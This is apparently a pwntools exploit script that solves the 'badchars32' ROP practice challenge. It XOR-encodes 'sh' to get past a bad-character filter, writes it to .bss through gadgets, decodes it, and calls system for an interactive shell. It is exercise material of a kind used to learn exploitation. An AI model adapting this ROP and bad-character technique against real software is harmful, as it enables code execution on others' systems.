#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

bin_sh = "sh\x00\x00"
badchar = ['b','i','c','/',' ','f','n','s']
paschar = []
bin_sh_pas = ""

for i in range(len(bin_sh)):
	paschar.append(ord(bin_sh[i]) ^ 5)
	bin_sh_pas += chr(paschar[i])
print paschar

for i in range(len(badchar)):
	badchar[i] = ord(badchar[i]) 
print badchar

elf = ELF("./badchars32")
sh = process("./badchars32")

system_plt = elf.plt["system"]
bss_addr = 0x0804A040
pop_esi_edi = 0x08048899
mov_edi_esi = 0x08048893
xor_ebx_cl = 0x08048890
pop_ecx = 0x08048897
pop_ebx = 0x08048461

payload = ""
payload += "A"*44
payload += p32(pop_esi_edi)
payload += bin_sh_pas
payload += p32(bss_addr)
payload += p32(mov_edi_esi)

for i in range(len(bin_sh_pas)):
	payload += p32(pop_ebx)
	payload += p32(bss_addr + i)
	payload += p32(pop_ecx)
	payload += p32(5)
	payload += p32(xor_ebx_cl)

payload += p32(system_plt)
payload += "AAAA"
payload += p32(bss_addr)

sh.sendline(payload)
sh.interactive()